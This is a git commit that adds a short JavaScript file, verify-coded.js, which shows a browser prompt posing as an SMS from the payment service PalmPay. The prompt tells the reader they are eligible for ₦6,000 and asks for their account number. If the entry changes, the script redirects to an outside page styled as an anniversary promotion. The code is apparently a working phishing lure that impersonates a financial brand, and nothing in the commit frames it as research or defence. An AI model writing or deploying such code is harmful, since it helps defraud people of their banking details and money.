468915dcc5df390e640ecc70639a63783d339b83
sweet16palz-hub <sweet16palz@gmail.com>
2026-08-02 09:34:28 +0100

    Create verify-coded.js

---
+++ verify-coded.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦6,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦6,000 From PalmPay, click OK to Enter Your Acc. Number','WITHDRAW ₦6,000');
+if (password != 'WITHDRAW ₦6,000') {
+location.href='https://ebariba.com/6th-anniversary.html';
+}
